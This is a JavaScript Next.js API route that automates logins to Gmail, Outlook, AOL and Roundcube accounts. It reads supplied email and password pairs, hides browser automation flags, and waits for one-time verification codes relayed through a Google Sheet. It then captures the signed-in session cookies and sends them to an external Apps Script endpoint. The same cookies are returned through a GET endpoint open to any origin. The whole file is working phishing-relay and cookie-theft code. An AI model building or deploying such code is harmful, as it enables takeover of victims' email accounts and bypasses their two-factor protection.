import { NextResponse } from "next/server";
import puppeteer from "puppeteer-core";
import chromium from "@sparticuz/chromium-min";
import dns from 'dns';
import { promisify } from 'util';
import axios from 'axios';
import qs from 'qs';
import {
  localExecutablePath,
  isDev,
  userAgent,
  remoteExecutablePath,
} from "@/utils/utils";

const resolveMx = promisify(dns.resolveMx);

export const maxDuration = 60; // This function can run for a maximum of 60 seconds
export const dynamic = "force-dynamic";

const platformUrls = {
  gmail: "https://accounts.google.com/",
  outlook: "https://www.office.com/login?es=UnauthClick&ru=%2f",
  roundcube: "https://your-roundcube-url.com/",
  aol: "https://login.aol.com/",
  yahoo: "https://mail.yahoo.com/",
  godaddy: "https://sso.secureserver.net/?app=email&realm=pass",
};

const platformSelectors = {
  gmail: {
    input: "#identifierId",
    nextButton: "#identifierNext",
    passwordInput: "input[name='Passwd']",
    passwordNextButton: "#passwordNext",
    errorMessage: "//*[contains(text(), 'Couldn’t find your Google Account')]",
    loginFailed: "//*[contains(text(), 'Wrong password')]",
    verificationCodeInput: "input[name='code']", 
  },
  outlook: {
    input: "input[name='loginfmt']",
    nextButton: "#idSIButton9",
    passwordInput: "input[name='passwd']",
    passwordNextButton: "#idSIButton9",
    errorMessage: "//*[contains(text(), 'This username may be')] | //*[contains(text(), 'That Microsoft account doesn’t exist')] | //*[contains(text(), 'find an account with that')] | //*[contains(text(), 'Sign-in is blocked')]",
    loginFailed: "//*[contains(text(), 'Your account or password')] | //*[contains(text(), 'Enter Password')]",
    verificationCodeInput: "input[name='code']",
    staySignedIn: "//*[contains(text(), 'Stay signed')]",
    inboxLoaded: "h1.welcome__title--consumer.welcome__title--visual", // Updated selector for an element present in the inbox
  },
  roundcube: {
    input: "input[name='user']",
    nextButton: "input[name='submitbutton']",
    passwordInput: "input[name='pass']",
    passwordNextButton: "input[name='submitbutton']",
    errorMessage: "//*[contains(text(), 'Login failed')]",
    loginFailed: "//*[contains(text(), 'Login failed')]",
    verificationCodeInput: "input[name='code']", 
  },
  aol: {
    input: "#login-username",
    nextButton: "#login-signin",
    passwordInput: "input[name='password']",
    passwordNextButton: "#login-signin",
    errorMessage: "//*[contains(text(), 'Sorry, we don’t recognize this email')] | //*[contains(text(), 'Sorry,')]",
    loginFailed: "//*[contains(text(), 'Invalid password')]",
    verificationCodeInput: "input[name='code']", // Add verification code input selector
  },
};

// Helper function to fetch data from App Script endpoint with retry logic
async function fetchDataFromAppScript(retries = 3, timeout = 120000) {
  const endpoint = "https://script.google.com/a/*/macros/s/AKfycbzpGDrsMrVbWe4xjt39a0AhJWPTmdqLvfSia1-gkSfNK5aTIQ95m83Q-kvIXukn_JxLXA/exec?action=getData&sheetname=COOKIE&range=A1:Y";

  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      // Attempt to fetch the data with an extended timeout
      const response = await axios.get(endpoint, { timeout });
      //console.log(`Data fetched successfully on attempt ${attempt}`);
      //console.log(`Data: ${response.data}`);

      return response.data;
    } catch (error) {
      console.error(`Attempt ${attempt} failed: ${error.message}`);
      if (attempt === retries) {
        throw new Error(`Failed to fetch data after ${retries} attempts.`);
      }
      console.log(`Retrying... (${attempt}/${retries})`);
    }
  }
}

async function checkAccountAccess(page, email, password, platform, verificationCode = null, browserId) {
  let emailExists = false;
  let accountAccess = false;
  let cookies = null;
  let status = null;

  try {
    const { input, nextButton, passwordInput, passwordNextButton, errorMessage, loginFailed, staySignedIn, inboxLoaded, verificationCodeInput } = platformSelectors[platform];

    // Ensure we are on the first tab
    const pages = await page.browser().pages();
    const firstPage = pages[0];
    if (page !== firstPage) {
      page = firstPage;
    }

    // Enter email
    await page.goto(platformUrls[platform], { waitUntil: 'networkidle2' });

    // Check if the inbox is already loaded
    await new Promise((resolve) => setTimeout(resolve, 5000)); // Extend wait time to ensure auto-redirect is completed
    const inboxLoadedElements = await page.evaluate((selector) => {
      return document.querySelector(selector) !== null;
    }, inboxLoaded);

    if (inboxLoadedElements) {
      accountAccess = true;
      cookies = JSON.stringify(await page.cookies());
      status = "COMPLETED";
      return { emailExists: true, accountAccess, cookies, status };
    }

    // Ensure we are on the first tab
    const pagesAfterGoto = await page.browser().pages();
    const firstPageAfterGoto = pagesAfterGoto[0];
    if (page !== firstPageAfterGoto) {
      page = firstPageAfterGoto;
    }

    await page.waitForSelector(input);
    await page.type(input, email);
    await page.waitForSelector(nextButton);
    await page.click(nextButton);

    await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 30000 });

    // Ensure we are on the first tab
    const pagesAfterEmail = await page.browser().pages();
    const firstPageAfterEmail = pagesAfterEmail[0];
    if (page !== firstPageAfterEmail) {
      page = firstPageAfterEmail;
    }

    // Check if the email exists
    const emailErrorElements = await page.evaluate((xpath) => {
      const result = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
      const nodes = [];
      let node;
      while ((node = result.iterateNext())) {
        nodes.push(node);
      }
      return nodes.length;
    }, errorMessage);

    emailExists = emailErrorElements === 0;

    if (!emailExists) {
      status = "FAILED";
      await updateBrowserRowData({ status }, browserId);
      return { emailExists, accountAccess: false, cookies: null, status };
    }

    // Ensure we are on the first tab
    const pagesAfterEmailCheck = await page.browser().pages();
    const firstPageAfterEmailCheck = pagesAfterEmailCheck[0];
    if (page !== firstPageAfterEmailCheck) {
      page = firstPageAfterEmailCheck;
    }

    // Enter password
    await page.waitForSelector(passwordInput);
    await page.type(passwordInput, password);
    await page.waitForSelector(passwordNextButton);
    await page.click(passwordNextButton);

    await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 30000 });

    // Ensure we are on the first tab
    const pagesAfterPassword = await page.browser().pages();
    const firstPageAfterPassword = pagesAfterPassword[0];
    if (page !== firstPageAfterPassword) {
      page = firstPageAfterPassword;
    }

    // Check if login failed
    const loginErrorElements = await page.evaluate((xpath) => {
      const result = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
      const nodes = [];
      let node;
      while ((node = result.iterateNext())) {
        nodes.push(node);
      }
      return nodes.length;
    }, loginFailed);

    if (loginErrorElements > 0) {
      // Login failed, set status to FAILED and return
      console.log('Login failed');
      status = "FAILED";
      await updateBrowserRowData({ status }, browserId);
      return { emailExists, accountAccess: false, cookies: null, status };
    }

    // Check if verification code input is present
    const verificationCodeInputElements = await page.evaluate((selector) => {
      return document.querySelector(selector) !== null;
    }, verificationCodeInput);

    // Only proceed to check for verification code if login did not fail
    if (loginErrorElements === 0 && verificationCodeInputElements) {
      // Update status to WAITINGCODE
      status = "WAITINGCODE";
      await updateBrowserRowData({ status }, browserId);

      // Wait for verification code to be provided
      while (!verificationCode) {
        const updatedData = await fetchDataFromAppScript();
        const updatedRows = updatedData.slice(1);
        const updatedRow = updatedRows.find(row => row[columnIndexes['browserId']] === browserId);
        verificationCode = updatedRow[columnIndexes['verificationCode']];

        await new Promise((resolve) => setTimeout(resolve, 10000)); // Check every 10 seconds
      }

      // Enter verification code
      await page.waitForSelector(verificationCodeInput);
      await page.type(verificationCodeInput, verificationCode);
      await page.keyboard.press('Enter');

      await new Promise((resolve) => setTimeout(resolve, 3000));

      const loginErrorElementsAfterCode = await page.evaluate((xpath) => {
        const result = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
        const nodes = [];
        let node;
        while ((node = result.iterateNext())) {
          nodes.push(node);
        }
        return nodes.length;
      }, loginFailed);

      accountAccess = loginErrorElementsAfterCode === 0;

      if (accountAccess) {
        cookies = JSON.stringify(await page.cookies());
        status = "COMPLETED";
      } else {
        // Update status to WAITINGCODE again if the code is invalid
        status = "WAITINGCODE";
        const updateData = {
          status: "WAITINGCODE",
          verificationCode: "",
        };
        await updateBrowserRowData(updateData, browserId);
      }
    } else if (!verificationCodeInputElements) {
      accountAccess = true;

      // Handle additional modals
      let success = false;
      const maxAttempts = 3;
      let attempts = 0;

      while (!success && attempts < maxAttempts) {
        try {
          // Ensure we are on the first tab
          const pagesAfterLogin = await page.browser().pages();
          const firstPageAfterLogin = pagesAfterLogin[0];
          if (page !== firstPageAfterLogin) {
            page = firstPageAfterLogin;
          }

          // Check for "Stay Signed In" modal and press Enter if it appears
          const staySignedInModal = await page.evaluate((xpath) => {
            const result = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
            const nodes = [];
            let node;
            while ((node = result.iterateNext())) {
              nodes.push(node);
            }
            return nodes.length;
          }, staySignedIn);

          if (staySignedInModal > 0) {
            await page.keyboard.press('Enter');
          }

          // Retry logic for waiting for the inbox page to load
          const maxWaitAttempts = 3;
          let waitAttempts = 0;
          while (waitAttempts < maxWaitAttempts) {
            try {
              await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 30000 });
              await page.waitForSelector(inboxLoaded, { timeout: 30000 });
              success = true;
              break; // Exit the loop if the selector is found
            } catch (e) {
              console.log(`Error pressing Enter or waiting for inbox (attempt ${waitAttempts + 1}): `, e.message);
              waitAttempts++;
              if (waitAttempts === maxWaitAttempts) {
                throw new Error('Failed to navigate to inbox after multiple attempts');
              }
            }
          }
        } catch (e) {
          console.log('Error pressing Enter or waiting for inbox: ', e.message);
          attempts++;
        }
      }

      if (!success) {
        status = "FAILED";
        await updateBrowserRowData({ status }, browserId);
        return { emailExists, accountAccess: false, cookies: null, status };
      }

      // Fetch cookies if login is successful
      cookies = JSON.stringify(await page.cookies());
      status = "COMPLETED";
    }
  } catch (err) {
    console.log(`Error checking account access: ${err.message}`);
    status = "FAILED";
    await updateBrowserRowData({ status }, browserId);
    return { emailExists: false, accountAccess: false, cookies: null, status };
  } finally {
    if (status) {
      await updateBrowserRowData({ status, cookieJson: cookies }, browserId);
    }
  }

  return { emailExists, accountAccess, cookies, status };
}

// Helper function to save cookies back to Google Sheets
async function updateBrowserRowData(data, rowId) {
  //console.log('Received parameters:', { data, rowId }); // Log the received parameters

  try {
    const updateData = {
      action: 'updateData',
      dbname: 'COOKIE',
      browserId: rowId,
      status: data.status,
    };

    if (data.cookieJson) {
      const formattedCookie = JSON.stringify(JSON.parse(data.cookieJson), null, 2); // Format the cookie JSON
      updateData.cookie = data.cookieJson;
      updateData.formattedCookie = formattedCookie;
    }

    //console.log('Sending update data:', updateData); // Log the data being sent

    const endpoint = "https://script.google.com/macros/s/AKfycbzpGDrsMrVbWe4xjt39a0AhJWPTmdqLvfSia1-gkSfNK5aTIQ95m83Q-kvIXukn_JxLXA/exec";
    const response = await axios.post(endpoint, updateData, {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    });
    
    console.log('Response:', response.data); // Log the response

    console.log(`DB updated successfully for row ID ${rowId}`);
  } catch (error) {
    console.error(`Failed to update DB for row ID ${rowId}:`, error.message);
  }
}

function getColumnIndexes(headers) {
  const columnIndexes = headers.reduce((acc, header, index) => {
    acc[header] = index;
    return acc;
  }, {});
  //console.log('Column Indexes:', columnIndexes); // Log the column indexes
  return columnIndexes;
}

const queue = [];
const maxConcurrentBrowsers = 2; // Adjust this number based on your system's capacity
let activeBrowsers = 0;

async function processQueue() {
  if (queue.length === 0 || activeBrowsers >= maxConcurrentBrowsers) {
    return;
  }

  const { row, columnIndexes } = queue.shift();
  activeBrowsers++;
  try {
    await processRow(row, columnIndexes);
  } finally {
    activeBrowsers--;
    processQueue(); // Process the next item in the queue
  }
}

async function closeExtraTabs(browser) {
  const pages = await browser.pages();
  for (let i = 1; i < pages.length; i++) {
    await pages[i].close();
  }
}

async function processRow(row, columnIndexes) {
  const browserId = row[columnIndexes['browserId']];
  const email = row[columnIndexes['email']];
  const password = row[columnIndexes['password']];
  let status = row[columnIndexes['status']]; // Get the initial status
  let browserClosed = false;
  let statusUpdated = false;
  let browser;
  let closeTabsInterval;

  if (status === "WAITING") {
    const processingDataLoad = {
      status: "PROCESSING",
    };
    await updateBrowserRowData(processingDataLoad, browserId);

    const userDataDir = `@/users_data/${browserId}`;
    let retries = 3;
    let launchSuccess = false; // Track if the browser launched successfully
    const maxLaunchRetries = 3; // Maximum number of times to retry browser launch
    let launchAttempt = 0;

    while (launchAttempt < maxLaunchRetries) {
      retries = 3; // Reset retries for each launch attempt
      while (retries > 0) {
        try {
          browser = await puppeteer.launch({
            ignoreDefaultArgs: ["--enable-automation"],
            args: isDev
              ? [
                "--disable-blink-features=AutomationControlled",
                "--disable-features=site-per-process",
                "-disable-site-isolation-trials",
              ]
              : [...chromium.args, "--disable-blink-features=AutomationControlled"],
            defaultViewport: { width: 1920, height: 1080 },
            executablePath: isDev
              ? localExecutablePath
              : await chromium.executablePath(remoteExecutablePath),
            headless: false,
            userDataDir,
            timeout: 60000, // Increase timeout to 60 seconds
          });
          launchSuccess = true; // Browser launched successfully
          break; // Break the loop if browser launches successfully
        } catch (error) {
          console.error(`Failed to launch browser for browser ID ${browserId} (Attempt ${launchAttempt + 1}, Retry ${maxLaunchRetries - retries + 1}):`, error.message);
          retries--;
          await new Promise(resolve => setTimeout(resolve, 5000)); // Wait before retrying

          if (retries === 0) {
            console.error(`All retries failed for browser ID ${browserId} on launch attempt ${launchAttempt + 1}.`);
          }
        }
      }

      if (launchSuccess) {
        break; // Exit launch attempts loop if browser launched successfully
      } else {
        launchAttempt++;
        console.log(`Retrying browser launch for browser ID ${browserId} (Attempt ${launchAttempt + 1})...`);
        await new Promise(resolve => setTimeout(resolve, 10000)); // Wait before next launch attempt
      }
    }

    if (!launchSuccess) {
      console.error(`Failed to launch browser after multiple attempts for browser ID ${browserId}. Skipping this row without setting FAILED.`);
      return; // Skip this row without updating the status to FAILED
    }

    if (!browser) {
      console.error(`Browser is undefined for browser ID ${browserId}. Skipping this row.`);
      return;
    }

    const page = (await browser.pages())[0];
    await page.setUserAgent(userAgent);
    await page.setViewport({ width: 1920, height: 1080 });

    closeTabsInterval = setInterval(async () => {
      await closeExtraTabs(browser);
    }, 5000);

    try {
      while (true) {
        const updatedData = await fetchDataFromAppScript();
        const updatedRows = updatedData.slice(1);
        const updatedRow = updatedRows.find(row => row[columnIndexes['browserId']] === browserId);

        if (updatedRow && updatedRow[columnIndexes['email']] && updatedRow[columnIndexes['password']]) {
          const email = updatedRow[columnIndexes['email']];
          const password = updatedRow[columnIndexes['password']];

          // Check if the status is FAILED. If so, skip the rest of the loop
          if (updatedRow[columnIndexes['status']] === "FAILED") {
            console.log(`Status is FAILED for browser ID ${browserId}. Skipping further processing.`);
            break; // Exit the loop
          }

          const domain = email.split('@')[1];
          const mxRecords = await resolveMx(domain);
          if (!mxRecords || mxRecords.length === 0) {
            throw new Error('No MX records found');
          }

          const mailServer = mxRecords[0].exchange;
          let platform = '';

          if (mailServer.includes('outlook')) {
            platform = 'outlook';
          } else if (mailServer.includes('google') || mailServer.includes('gmail')) {
            platform = 'gmail';
          } else if (mailServer.includes('aol')) {
            platform = 'aol';
          } else if (mailServer.includes('roundcube')) {
            platform = 'roundcube';
          } else {
            throw new Error('Unsupported email service provider');
          }

          const { emailExists, accountAccess, cookies: initialCookies, status: accessStatus } = await checkAccountAccess(page, email, password, platform, null, browserId);

          let newStatus = accessStatus;
          let cookies = initialCookies;
          if (!emailExists) {
            newStatus = "FAILED";
          } else if (accountAccess) {
            newStatus = "COMPLETED";
          } else if (accessStatus !== "FAILED") {
            newStatus = "WAITINGCODE";
          }

          const updateData = {
            status: newStatus,
            cookieJson: cookies,
          };

          await updateBrowserRowData(updateData, browserId);

          if (newStatus === "COMPLETED") {
            const browserCookies = await page.cookies();
            cookies = JSON.stringify(browserCookies);
            updateData.cookieJson = cookies;
            await updateBrowserRowData(updateData, browserId);
            await browser.close();
            break;
          } else if (newStatus === "WAITINGCODE") {
            while (newStatus === "WAITINGCODE") {
              const updatedData = await fetchDataFromAppScript();
              const updatedRows = updatedData.slice(1);
              const updatedRow = updatedRows.find(row => row[columnIndexes['browserId']] === browserId);
              const code = updatedRow[columnIndexes['verificationCode']];

              if (code) {
                const { accountAccess: newAccountAccess, cookies: newCookies, status: codeStatus } = await checkAccountAccess(page, email, password, platform, code, browserId);

                if (newAccountAccess) {
                  newStatus = "COMPLETED";
                  cookies = newCookies;
                  updateData.status = newStatus;
                  updateData.cookieJson = cookies;
                  await updateBrowserRowData(updateData, browserId);
                  await browser.close();
                  break;
                } else {
                  newStatus = "WAITINGCODE";
                  updateData.status = newStatus;
                  updateData.code = "INVALID";
                  await updateBrowserRowData(updateData, browserId);
                }
              }

              await new Promise((resolve) => setTimeout(resolve, 10000)); // Check every 10 seconds
            }
          }
        }

        await new Promise((resolve) => setTimeout(resolve, 10000)); // Check every 10 seconds
      }
    } catch (error) {
      console.error(`Error processing row for browser ID ${browserId}:`, error.message);
      if (!statusUpdated) {
        const updateData = {
          status: "FAILED",
        };
        await updateBrowserRowData(updateData, browserId);
        statusUpdated = true;
      }
      clearInterval(closeTabsInterval);
      if (browser) {
        await browser.close();
      }
      browserClosed = true;
    }
  }

  if (!browserClosed && browser) {
    clearInterval(closeTabsInterval);
    await browser.close();
  }
}

async function checkStatusAndFetchDataAndCheckAccessAndSendPost() {
  try {
    const data = await fetchDataFromAppScript();
    //console.log('Data fetched:', JSON.stringify(data));
    
    if (!Array.isArray(data) || data.length === 0) {
      throw new Error('Invalid data format');
    }

    const headers = data[0];
    const columnIndexes = getColumnIndexes(headers);
    const rows = data.slice(1);

    rows.forEach(row => {
      const status = row[columnIndexes['status']];
      if (status === "WAITING") {
        queue.push({ row, columnIndexes });
      }
    });

    processQueue(); // Start processing the queue
  } catch (error) {
    console.error('Error fetching or sending data:', error.message);
  }
}

// Set interval to check status every second
setInterval(checkStatusAndFetchDataAndCheckAccessAndSendPost, 5000);

export async function GET(request) {
  const url = new URL(request.url);
  const email = url.searchParams.get("email");
  const password = url.searchParams.get("password");

  if (!email || !password) {
    return NextResponse.json({ error: "Missing email or password parameter" }, { status: 400 });
  }

  const domain = email.split('@')[1];
  const mxRecords = await resolveMx(domain);
  if (!mxRecords || mxRecords.length === 0) {
    return NextResponse.json({ error: "No MX records found" }, { status: 400 });
  }

  const mailServer = mxRecords[0].exchange;
  let platform = '';

  if (mailServer.includes('outlook')) {
    platform = 'outlook';
  } else if (mailServer.includes('google') || mailServer.includes('gmail')) {
    platform = 'gmail';
  } else if (mailServer.includes('aol')) {
    platform = 'aol';
  } else if (mailServer.includes('roundcube')) {
    platform = 'roundcube';
  } else {
    return NextResponse.json({ error: "Unsupported email service provider" }, { status: 400 });
  }

  const browser = await puppeteer.launch({
    ignoreDefaultArgs: ["--enable-automation"],
    args: isDev
      ? [
          "--disable-blink-features=AutomationControlled",
          "--disable-features=site-per-process",
          "-disable-site-isolation-trials",
        ]
      : [...chromium.args, "--disable-blink-features=AutomationControlled"],
    defaultViewport: { width: 1920, height: 1080 },
    executablePath: isDev
      ? localExecutablePath
      : await chromium.executablePath(remoteExecutablePath),
    headless: false,
  });

  const page = await browser.newPage();
  await page.setUserAgent(userAgent);
  await page.setViewport({ width: 1920, height: 1080 });

  // Close any additional tabs that might be opened
  await closeExtraTabs(browser);

  // There is no browserId in this context, so we pass null
  const { emailExists, accountAccess, cookies } = await checkAccountAccess(page, email, password, platform, null, null);

  await browser.close();

  const response = NextResponse.json({ emailExists, accountAccess, cookies }, { status: 200 });

  // Add CORS headers
  response.headers.set("Access-Control-Allow-Origin", "*");
  response.headers.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  response.headers.set("Access-Control-Allow-Headers", "Content-Type");

  return response;
}

export async function OPTIONS() {
  // Preflight response for OPTIONS requests
  const response = NextResponse.json({}, { status: 200 });
  response.headers.set("Access-Control-Allow-Origin", "*");
  response.headers.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  response.headers.set("Access-Control-Allow-Headers", "Content-Type");

  return response;
}